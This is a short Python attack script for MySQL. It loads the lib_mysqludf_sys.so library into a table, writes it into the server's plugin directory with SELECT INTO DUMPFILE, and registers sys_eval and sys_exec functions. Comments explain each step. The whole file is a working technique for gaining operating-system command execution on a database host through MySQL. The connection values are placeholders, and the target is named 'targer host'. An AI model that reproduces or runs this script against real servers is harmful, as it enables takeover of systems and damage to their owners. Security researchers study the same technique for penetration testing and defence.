#!/usr/bin/python
# -*- coding: utf-8 -*-

# Cemal Turkoglu

import MySQLdb as mdb

host = "targer host"
user = "username"
password = "password"
db = "database name"

con = mdb.connect(host, user, password, db)

with con:
    fin = open("lib_mysqludf_sys.so","rb+")
    lib = fin.read()
    # content of library file is read

    cur = con.cursor()
    cur.execute("DROP TABLE if exists myTable");
    cur.execute("CREATE TABLE myTable(line blob)")
    # a table is created 

    cur.execute("INSERT INTO myTable VALUES(%s)", (lib,))
    # content of the library is loaded to table

    cur.execute("SELECT * FROM myTable into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so'")
    # lib_mysqludf_sys.so file written to target system under mysql plugin path
    # it is done via table

    cur.execute("DROP FUNCTION if exists sys_eval")
    query = """CREATE FUNCTION sys_eval RETURNS string
               SONAME 'lib_mysqludf_sys.so' """

    cur.execute(query)
    # sys_eval function is created

    cur.execute("DROP FUNCTION if exists sys_exec")
    query = """CREATE FUNCTION sys_exec RETURNS integer
               SONAME 'lib_mysqludf_sys.so' """
    cur.execute(query)
    # sys_exec function is created

    print("DONE!..")

    
